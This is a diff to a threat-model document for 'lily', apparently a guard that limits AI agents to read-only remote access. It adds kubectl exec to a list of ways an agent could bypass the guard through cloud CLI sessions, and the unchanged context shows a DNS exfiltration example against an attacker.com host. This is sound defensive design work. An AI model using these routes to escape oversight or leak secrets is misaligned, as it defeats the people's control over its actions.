@@ -277,11 +277,11 @@ knows a hostname, it could `dig known-secret.attacker.com` as a signal.
 
 **Mitigation**: Network-level DNS monitoring on the remote host.
 
-### 6. Cloud CLI Bypass
+### 6. Cloud CLI & kubectl Bypass
 
-An unsandboxed agent could run `aws ssm start-session`, `gcloud compute ssh`, or `az ssh vm` directly to open an unrestricted SSH session to a cloud instance, bypassing lily's read-only validation.
+An unsandboxed agent could run `aws ssm start-session`, `gcloud compute ssh`, `az ssh vm`, or `kubectl exec` directly to execute arbitrary commands on a remote instance or pod, bypassing lily's read-only validation.
 
-**Mitigation**: The lily guard hook detects and rewrites these commands to use `lily aws`, `lily gcloud`, or `lily azure` respectively. In a sandboxed environment, the cloud CLIs should not be directly accessible to the agent.
+**Mitigation**: The lily guard hook detects and rewrites these commands to use `lily aws`, `lily gcloud`, `lily azure`, or `lily kubectl` respectively. In a sandboxed environment, the cloud CLIs and kubectl should not be directly accessible to the agent.
 
 ---
 
@@ -555,7 +555,7 @@ configured sandbox creates a defense-in-depth posture where:
 5. The agent **cannot** exfiltrate via SSRF (cloud metadata IPs blocked)
 6. The agent **cannot** MITM connections (TOFU host key verification)
 7. The agent **cannot** inject commands via ProxyCommand (not supported)
-8. The agent **cannot** bypass lily via cloud CLI SSH (guard rewrites to lily)
+8. The agent **cannot** bypass lily via cloud CLI SSH or kubectl exec (guard rewrites to lily)
 
 ---
 
